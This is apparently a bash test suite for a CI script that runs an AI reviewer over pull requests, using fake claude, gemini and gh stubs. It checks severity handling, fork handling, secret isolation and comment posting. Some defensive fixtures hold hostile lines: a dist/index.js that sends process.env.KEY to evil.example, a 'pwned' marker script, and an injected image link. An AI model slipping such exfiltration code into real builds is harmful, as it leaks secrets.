#!/bin/bash
# Cases for skills/objection/ci-review.sh against a local "GitHub" (a bare
# repository with refs/pull/<n>/head) and a fake `claude`, so no model is
# called and nothing leaves the machine.
set -u
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
CI="$ROOT/skills/objection/ci-review.sh"
T=$(mktemp -d)
trap 'rm -rf "$T"' EXIT
gitc() { git -c user.email=t@t -c user.name=t "$@"; }
failures=0
fail() { echo "FAIL: $*"; failures=$((failures + 1)); }
has() { grep -qF -- "$2" "$1" || fail "$1 lacks [$2]"; }
hasnt() { grep -qF -- "$2" "$1" && fail "$1 has [$2]"; }

# The fake answers with the rows in $T/answer and records its model and stdin.
cat >"$T/claude" <<'STUB'
#!/bin/bash
printf '%s\n' "$@" >"$FAKE_DIR/args"
env >"$FAKE_DIR/env"
cat >"$FAKE_DIR/stdin"
[ -f "$FAKE_DIR/broken" ] && exit 1
node -e 'process.stdout.write(JSON.stringify({result: require("fs").readFileSync(process.argv[1], "utf8"), usage: {input_tokens: 5, output_tokens: 5}, total_cost_usd: 0.01}))' "$FAKE_DIR/answer"
STUB
chmod +x "$T/claude"
export OBJECTION_CLAUDE="$T/claude" FAKE_DIR="$T" ANTHROPIC_API_KEY=test
answer() {
  { printf '| severity | kind | file:line | defect | evidence | proof |\n|---|---|---|---|---|---|\n'
    for s in "$@"; do printf '| %s | BUG | src/a.ts:3 | defect %s | read | path |\n' "$s" "$s"; done
  } >"$T/answer"
}

# "GitHub": main, and a PR whose head adds a file that would run if executed.
B="$T/remote.git"
git init -q --bare "$B"
W="$T/w"
git init -q "$W" && cd "$W" || exit 1
printf '{"bases":["main"],"invariants":[{"paths":"^src/","rule":"RULE FROM BASE"}]}\n' >.objection.json
mkdir -p src && seq 1 10 >src/a.ts
git add . && gitc commit -q -m base && git branch -M main && git push -q "$B" main
printf 'x\n' >>src/a.ts
printf '{"bases":["main"],"invariants":[{"paths":"^src/","rule":"RULE FROM PR"}]}\n' >.objection.json
printf '#!/bin/sh\ntouch "%s/pwned"\n' "$T" >run-me.sh
git add . && gitc commit -q -m pr && git push -q "$B" HEAD:refs/pull/7/head
head=$(git rev-parse HEAD)
event() { # title head-sha [head-repo]
  printf '{"pull_request":{"number":7,"title":"%s","base":{"ref":"main","repo":{"full_name":"o/r"}},"head":{"sha":"%s","repo":{"full_name":"%s"}}}}\n' "$1" "$2" "${3:-o/r}" >"$T/event.json"
}
export GITHUB_EVENT_PATH="$T/event.json" OBJECTION_CI_REMOTE="$B" GITHUB_STEP_SUMMARY="$T/summary"
cd "$T" || exit 1
run() { rm -f "$T/summary" "$T/stdin" "$T/args"; bash "$CI" >"$T/out" 2>"$T/err"; }

# No finding: passes, reviews the PR head against main, with the base's rules.
event "Add x" "$head"; answer
run || fail "a clean review failed ($(cat "$T/err"))"
has "$T/summary" "objection review: passed"
has "$T/stdin" "RULE FROM BASE (guards"
hasnt "$T/stdin" "RULE FROM PR (guards"
has "$T/stdin" "Goal: Add x"
has "$T/stdin" "+x"
grep -qx sonnet "$T/args" || fail "the default model is not sonnet"
[ -e "$T/pwned" ] && fail "the PR's code ran"

# A BLOCKER fails under the default; a HIGH only under fail-on high.
answer BLOCKER
run && fail "a BLOCKER passed"
has "$T/summary" "failed: 1 BLOCKER"
answer HIGH MEDIUM
run || fail "a HIGH failed under fail-on blocker"
has "$T/summary" "1 HIGH, 1 MEDIUM"
OBJECTION_FAIL_ON=high run && fail "a HIGH passed under fail-on high"
has "$T/summary" "failed: 0 BLOCKER, 1 HIGH"
answer BLOCKER
OBJECTION_FAIL_ON=none run || fail "fail-on none failed"
OBJECTION_FAIL_ON=bogus run && fail "an unknown fail-on was accepted"
# A word that only starts like a severity is not a finding.
{ printf '| severity | kind |\n|---|---|\n| Blockers noted: none | x |\n'; } >"$T/answer"
run || fail "a row starting with Blockers counted as a BLOCKER"

# Fails closed: the reviewer broken, no key, a head the event does not name.
answer; touch "$T/broken"
run && fail "a broken reviewer passed"
has "$T/summary" "the accuser did not run"
rm -f "$T/broken"
ANTHROPIC_API_KEY= run && fail "no API key passed"
# runner gemini: its own key, the Gemini CLI, named in the summary.
cat >"$T/gemini" <<'STUB'
#!/bin/bash
printf '%s\n' "$@" >"$FAKE_DIR/gemini-args"
cat >"$FAKE_DIR/stdin"
node -e 'process.stdout.write(JSON.stringify({response: require("fs").readFileSync(process.argv[1], "utf8"), stats: {models: {g: {tokens: {prompt: 5, candidates: 5}}}}}))' "$FAKE_DIR/answer"
STUB
chmod +x "$T/gemini"
event "Add x" "$head"; answer BLOCKER
OBJECTION_RUNNER=gemini OBJECTION_GEMINI="$T/gemini" GEMINI_API_KEY=test ANTHROPIC_API_KEY= run && fail "a gemini BLOCKER passed"
has "$T/summary" "Accuser: gemini (the CLI default model)"
has "$T/summary" "1 BLOCKER"
has "$T/gemini-args" "--approval-mode"
[ -e "$T/args" ] && fail "runner gemini ran claude"
# The same BLOCKER in a table without outer pipes still fails the check.
printf 'severity | kind | file:line | defect | evidence | proof\n--- | --- | --- | --- | --- | ---\nBLOCKER | BUG | src/a.ts:3 | defect | read | path\n' >"$T/answer"
OBJECTION_RUNNER=gemini OBJECTION_GEMINI="$T/gemini" GEMINI_API_KEY=test ANTHROPIC_API_KEY= run && fail "a pipe-less BLOCKER passed"
has "$T/summary" "1 BLOCKER"
OBJECTION_RUNNER=gemini OBJECTION_GEMINI="$T/gemini" GEMINI_API_KEY= run && fail "gemini without its key passed"
has "$T/err" "GEMINI_API_KEY is not set"
OBJECTION_RUNNER=codex run
[ $? = 2 ] || fail "an unknown runner did not exit 2"
# comment: true posts one PR comment, then edits it; a failure to post
# does not change the verdict.
cat >"$T/gh" <<'STUB'
#!/bin/bash
printf '%s\n' "$*" >>"$FAKE_DIR/gh-calls"
prev=""; for a in "$@"; do [ "$prev" = --input ] && cp "$a" "$FAKE_DIR/gh-body"; prev="$a"; done
case "$*" in
  *--paginate*) [ -n "${FAKE_GH_LIST_FAIL:-}" ] && exit 1; printf '%s' "${FAKE_GH_EXISTING:-}"; exit 0 ;;
  *PATCH*"comments/${FAKE_GH_FOREIGN:-none}"*) exit 1 ;;
esac
[ -n "${FAKE_GH_FAIL:-}" ] && exit 1
exit 0
STUB
chmod +x "$T/gh"
event "Add x" "$head"; answer BLOCKER
rm -f "$T/gh-calls"
OBJECTION_COMMENT=true OBJECTION_GH_BIN="$T/gh" GITHUB_REPOSITORY=o/r run && fail "a BLOCKER passed with a comment"
grep -q -- "-X POST repos/o/r/issues/7/comments" "$T/gh-calls" || fail "no comment was posted ($(cat "$T/gh-calls"))"
node -e 'const b = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8")).body; if (!b.startsWith("<!-- objection-review -->") || !b.includes("1 BLOCKER")) process.exit(1)' "$T/gh-body" || fail "the comment body is wrong"
rm -f "$T/gh-calls"
FAKE_GH_EXISTING=42 OBJECTION_COMMENT=true OBJECTION_GH_BIN="$T/gh" GITHUB_REPOSITORY=o/r run
grep -q -- "-X PATCH repos/o/r/issues/comments/42" "$T/gh-calls" || fail "the existing comment was not edited"
grep -q -- "-X POST" "$T/gh-calls" && fail "a second comment was posted"
# A listing that fails posts nothing; a marked comment this token cannot
# edit is skipped for the next one; an @name does not ping.
rm -f "$T/gh-calls"
FAKE_GH_LIST_FAIL=1 OBJECTION_COMMENT=true OBJECTION_GH_BIN="$T/gh" GITHUB_REPOSITORY=o/r run
grep -qE -- "-X (POST|PATCH)" "$T/gh-calls" && fail "a comment was written after the listing failed"
has "$T/err" "could not be listed"
rm -f "$T/gh-calls"
FAKE_GH_EXISTING="7
42" FAKE_GH_FOREIGN=7 OBJECTION_COMMENT=true OBJECTION_GH_BIN="$T/gh" GITHUB_REPOSITORY=o/r run
grep -q -- "-X PATCH repos/o/r/issues/comments/42" "$T/gh-calls" || fail "the editable comment was not used after a foreign one"
grep -q -- "-X POST" "$T/gh-calls" && fail "a new comment was posted although one could be edited"
printf '| BLOCKER | BUG | src/a.ts:3 | ask @octocat | read | p |\n' >"$T/answer"
OBJECTION_COMMENT=true OBJECTION_GH_BIN="$T/gh" GITHUB_REPOSITORY=o/r run
node -e 'const b = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8")).body; if (b.includes("@octocat") || !b.includes("@\u200boctocat")) process.exit(1)' "$T/gh-body" || fail "an @mention would ping"
# Text past node's 64 KiB stdin chunk keeps its accents (setEncoding).
node -e 'process.stdout.write("| LOW | BUG | src/a.ts:3 | " + "é".repeat(40000) + " | read | p |\n")' >"$T/answer"
OBJECTION_COMMENT=true OBJECTION_GH_BIN="$T/gh" GITHUB_REPOSITORY=o/r run
node -e 'const b = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8")).body; if (b.includes("\ufffd")) process.exit(1)' "$T/gh-body" || fail "a character split across stdin chunks was corrupted"
# A comment that cannot even be written leaves the verdict alone.
answer
OBJECTION_COMMENT=true OBJECTION_GH_BIN="$T/gh" GITHUB_REPOSITORY= run || fail "no repository name failed a clean review"
answer
FAKE_GH_FAIL=1 OBJECTION_COMMENT=true OBJECTION_GH_BIN="$T/gh" GITHUB_REPOSITORY=o/r run || fail "a failed comment failed a clean review"
has "$T/err" "the PR comment could not be posted"
rm -f "$T/gh-calls"
run
[ -e "$T/gh-calls" ] && fail "a comment was posted without comment: true"
# A fork's PR: not reviewed (and not passed) unless review-forks is on.
event "Add x" "$head" "stranger/r"; answer
rm -f "$T/stdin"
run && fail "a fork's PR passed without a review"
[ -e "$T/stdin" ] && fail "the accuser ran on a fork's PR"
has "$T/summary" "not run on a fork's PR"
OBJECTION_REVIEW_FORKS=true run || fail "review-forks: true did not review the fork's PR"
# A deleted fork has no head repository: still a stranger's diff.
printf '{"pull_request":{"number":7,"title":"x","base":{"ref":"main","repo":{"full_name":"o/r"}},"head":{"sha":"%s","repo":null}}}\n' "$head" >"$T/event.json"
run && fail "a deleted fork's PR passed without a review"
[ -e "$T/stdin" ] && fail "the accuser ran on a deleted fork's PR"
event "Add x" "$head"
# The reviewer sees neither the GitHub token nor the other runner's key.
answer
GITHUB_TOKEN=tok-x GEMINI_API_KEY=gem-x run
grep -q 'tok-x' "$T/env" && fail "the reviewer saw GITHUB_TOKEN"
grep -q 'gem-x' "$T/env" && fail "the claude reviewer saw GEMINI_API_KEY"
# No findings table: not a review. "NO FINDINGS" is.
printf 'I could not review this.\n' >"$T/answer"
run && fail "an answer with no table passed"
has "$T/summary" "no findings table"
printf 'NO FINDINGS\n' >"$T/answer"
run || fail "NO FINDINGS failed the review"
printf 'NO FINDINGS.\n' >"$T/answer"
run || fail "NO FINDINGS. failed the review"
# Finding rows without a header row are still a table.
printf '| 1 | LOW | BUG | a.ts:1 | x | read | p |\n' >"$T/answer"
run || fail "a LOW row without a header failed the review"
printf 'I could not review this.\n' >"$T/answer"
OBJECTION_FAIL_ON=none run && fail "fail-on none passed an answer with no table"
# A diff cut for size fails, unless fail-on is none.
answer
OBJECTION_BRIEF_MAX_LINES=2 run && fail "a truncated diff passed"
has "$T/summary" "too large for one review"
OBJECTION_BRIEF_MAX_LINES=2 OBJECTION_FAIL_ON=none run || fail "fail-on none failed a truncated diff"
# Model text cannot hide the rest of the summary or load an image.
printf '| LOW | BUG | src/a.ts:3 | <!-- hide ![x](https://evil.example/q) | read | p |\n' >"$T/answer"
run
hasnt "$T/summary" "<!-- hide"
hasnt "$T/summary" "![x]"
# Only the bot's own marked comments are candidates for an edit.
answer
rm -f "$T/gh-calls"
OBJECTION_COMMENT=true OBJECTION_GH_BIN="$T/gh" GITHUB_REPOSITORY=o/r run
grep -q 'github-actions\[bot\]' "$T/gh-calls" || fail "the comment lookup does not filter on the bot"
event "Add x" "0000000000000000000000000000000000000000"
run && fail "a stale head passed"
has "$T/err" "pushed again?"
# An error the script did not foresee fails too (bash 3.2 would exit 0).
event "Add x" "$head"; answer
mkdir -p "$T/summary-dir"
GITHUB_STEP_SUMMARY="$T/summary-dir" bash "$CI" >/dev/null 2>&1 && fail "a failed summary write passed"
# An unset variable late in the script (bash 3.2 exits 0 on it under an
# EXIT trap): a copy with one injected before the end must still fail.
mkdir -p "$T/copy" && cp "$ROOT"/skills/objection/*.sh "$ROOT"/skills/objection/*.mjs "$T/copy/" && cp -R "$ROOT/skills/objection/roles" "$T/copy/"
sed 's/^finished=yes$/: "$objection_unset"; finished=yes/' "$CI" >"$T/copy/ci-review.sh"
grep -qF objection_unset "$T/copy/ci-review.sh" || fail "the injection did not apply"
bash "$T/copy/ci-review.sh" >/dev/null 2>&1 && fail "an unbound variable passed"
# A brief that cannot be built fails with the reason in the summary; a PR
# whose every file is excluded noise passes as nothing to review.
event "Add x" "$head"
cd "$W" && git checkout -q -b lock HEAD~1 && printf 'lock\n' >pnpm-lock.yaml && git add . && gitc commit -q -m lock &&
  git push -q -f "$B" HEAD:refs/pull/7/head && cd "$T" || exit 1
event "Lock" "$(git -C "$W" rev-parse HEAD)"
run || fail "a PR of excluded files failed ($(cat "$T/err"))"
has "$T/summary" "nothing to review"
[ -e "$T/stdin" ] && fail "the accuser ran on a PR of excluded files"
# Build output is reviewed in CI: a PR that touches only dist/ is what a
# JavaScript Action ships.
cd "$W" && git checkout -q -b dist main 2>/dev/null || git checkout -q -b dist HEAD~1
mkdir -p dist && printf 'fetch("https://evil.example/?k=" + process.env.KEY)\n' >dist/index.js && git add . && gitc commit -q -m dist &&
  git push -q -f "$B" HEAD:refs/pull/7/head && cd "$T" || exit 1
event "Dist" "$(git -C "$W" rev-parse HEAD)"; answer
rm -f "$T/stdin"
run
has "$T/stdin" "dist/index.js"
git -C "$B" update-ref -d refs/heads/main
run && fail "a missing base passed"
printf '{"push":{}}\n' >"$T/event.json"
run && fail "a non-PR event passed"

[ "$failures" -eq 0 ] && echo "ci-review: all cases passed" || { echo "ci-review: $failures failure(s)"; exit 1; }
